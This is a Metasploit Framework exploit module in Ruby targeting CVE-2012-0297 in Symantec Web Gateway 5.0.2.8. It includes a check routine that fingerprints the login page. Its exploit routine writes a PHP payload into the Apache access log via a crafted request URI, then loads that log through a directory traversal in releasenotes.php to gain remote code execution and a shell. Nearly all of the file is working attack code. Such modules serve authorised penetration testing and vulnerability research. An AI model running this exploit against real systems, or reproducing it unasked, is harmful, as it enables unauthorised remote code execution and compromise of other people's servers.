##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Symantec Web Gateway 5.0.2.8 Command Execution Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability found in Symantec Web Gateway's HTTP
				service.  By injecting PHP code in the access log, it is possible to load it
				with a directory traversal flaw, which allows remote code execution under the
				context of 'apache'. Please note that it may take up to several minutes to
				retrieve access_log, which is about the amount of time required to see a shell
				back.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Unknown', #Discovery
					'muts',    #PoC
					'sinn3r'   #Metasploit
				],
			'References'     =>
				[
					['CVE', '2012-0297'],
					['EDB', '18932'],
					['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'WfsDelay' => 300,  #5 minutes
					'DisablePayloadHandler' => 'false',
					'ExitFunction' => "none"
				},
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Targets'        =>
				[
					['Symantec Web Gateway 5.0.2.8', {}],
				],
			'Privileged'     => false,
			'DisclosureDate' => "May 17 2012",
			'DefaultTarget'  => 0))
	end


	def check
		res = send_request_raw({
			'method' => 'GET',
			'uri'    => '/spywall/login.php'
		})

		if res and res.body =~ /\<title\>Symantec Web Gateway\<\/title\>/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end


	def exploit
		peer = "#{rhost}:#{rport}"

		php = %Q|<?php #{payload.encoded} ?>|

		# Inject PHP to log
		print_status("#{peer} - Injecting PHP to log...")
		res = send_request_raw({
			'method' => 'GET',
			'uri'    => "/#{php}"
		})

		select(nil, nil, nil, 1)

		# Use the directory traversal to load the PHP code
		# access_log takes a long time to retrieve
		print_status("#{peer} - Loading PHP code..")
		send_request_raw({
			'method' => 'GET',
			'uri'    => '/spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log'
		})

		print_status("#{peer} - Waiting for a session, may take some time...")

		select(nil, nil, nil, 1)

		handler
	end
end
